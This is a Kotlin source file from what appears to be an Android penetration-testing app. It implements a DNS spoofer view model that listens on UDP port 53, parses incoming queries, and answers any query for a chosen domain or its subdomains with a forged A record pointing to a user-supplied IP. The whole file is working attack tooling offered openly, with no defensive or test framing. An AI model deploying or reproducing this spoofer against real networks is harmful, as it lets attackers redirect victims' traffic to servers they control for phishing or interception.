package org.indra.android.ui.screens.plugins

import android.content.Context
import android.net.wifi.WifiManager
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import dagger.hilt.android.lifecycle.HiltViewModel
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import javax.inject.Inject

data class DnsSpooferUiState(
    val domain: String = "",
    val spoofIp: String = "",
    val isRunning: Boolean = false,
    val log: List<String> = emptyList(),
    val error: String? = null
)

@HiltViewModel
class DnsSpooferViewModel @Inject constructor(
    @ApplicationContext private val context: Context
) : ViewModel() {
    private val _uiState = MutableStateFlow(DnsSpooferUiState())
    val uiState: StateFlow<DnsSpooferUiState> = _uiState.asStateFlow()

    fun updateDomain(v: String) { _uiState.value = _uiState.value.copy(domain = v) }
    fun updateIp(v: String) { _uiState.value = _uiState.value.copy(spoofIp = v) }

    private var job: Job? = null

    fun start() {
        if (job?.isActive == true) return
        val st = _uiState.value
        val domain = st.domain.trim()
        val spoofIp = st.spoofIp.trim()
        if (domain.isEmpty() || spoofIp.isEmpty()) {
            _uiState.value = st.copy(error = "Domain and spoof IP required")
            return
        }
        _uiState.value = st.copy(isRunning = true, error = null, log = emptyList())
        job = viewModelScope.launch(Dispatchers.IO) {
            var socket: DatagramSocket? = null
            try {
                socket = DatagramSocket(53, InetAddress.getByName("0.0.0.0"))
                val buf = ByteArray(512)
                val ipBytes = spoofIp.split(".").map { it.toInt().toByte() }.toByteArray()
                while (isActive) {
                    val pkt = DatagramPacket(buf, buf.size)
                    try { socket.receive(pkt) } catch (e: Exception) { if (!isActive) break; continue }
                    val data = pkt.data.copyOf(pkt.length)
                    // Parse DNS question to get queried domain
                    val qname = parseDnsQuestion(data)
                    if (qname != null && (qname == domain || qname.endsWith(".$domain"))) {
                        withContext(Dispatchers.Main) {
                            _uiState.value = _uiState.value.copy(log = _uiState.value.log + "Spoofing $qname -> $spoofIp")
                        }
                        val resp = buildDnsResponse(data, ipBytes)
                        if (resp != null) {
                            val out = DatagramPacket(resp, resp.size, pkt.address, pkt.port)
                            socket.send(out)
                        }
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    _uiState.value = _uiState.value.copy(error = e.message, isRunning = false)
                }
            } finally {
                socket?.close()
            }
        }
    }

    fun stop() {
        job?.cancel(); job = null
        _uiState.value = _uiState.value.copy(isRunning = false)
    }

    private fun parseDnsQuestion(data: ByteArray): String? {
        if (data.size < 12) return null
        val qdcount = ((data[4].toInt() and 0xff) shl 8) or (data[5].toInt() and 0xff)
        if (qdcount < 1) return null
        var idx = 12
        val labels = mutableListOf<String>()
        while (idx < data.size) {
            val len = data[idx].toInt() and 0xff
            if (len == 0) { idx++; break }
            if (len > 63 || idx + 1 + len > data.size) return null
            labels.add(String(data, idx + 1, len))
            idx += 1 + len
        }
        return labels.joinToString(".")
    }

    private fun buildDnsResponse(query: ByteArray, ip: ByteArray): ByteArray? {
        if (query.size < 12) return null
        // Header: copy ID, set flags (response, authoritative), qdcount=1, ancount=1
        val resp = ByteArray(query.size + 16)
        System.arraycopy(query, 0, resp, 0, 12)
        resp[2] = 0x81.toByte(); resp[3] = 0x80.toByte() // response + recursion available
        // qdcount already 1; ancount = 1
        resp[6] = 0x00; resp[7] = 0x01
        // Copy question section
        var idx = 12
        while (idx < query.size && query[idx].toInt() != 0) {
            val len = query[idx].toInt() and 0xff
            if (len > 63) return null
            idx += 1 + len
        }
        idx++ // null terminator
        idx += 4 // QTYPE + QCLASS
        if (idx > query.size) return null
        System.arraycopy(query, 12, resp, 12, idx - 12)
        // Answer: pointer to name (0xC00C), type A, class IN, TTL, rdlength 4, rdata IP
        val aidx = idx
        resp[aidx] = 0xC0.toByte(); resp[aidx + 1] = 0x0C.toByte()
        resp[aidx + 2] = 0x00; resp[aidx + 3] = 0x01 // type A
        resp[aidx + 4] = 0x00; resp[aidx + 5] = 0x01 // class IN
        resp[aidx + 6] = 0x00; resp[aidx + 7] = 0x00; resp[aidx + 8] = 0x00; resp[aidx + 9] = 0x1E // TTL 30
        resp[aidx + 10] = 0x00; resp[aidx + 11] = 0x04 // rdlength
        resp[aidx + 12] = ip[0]; resp[aidx + 13] = ip[1]; resp[aidx + 14] = ip[2]; resp[aidx + 15] = ip[3]
        return resp.copyOf(aidx + 16)
    }
}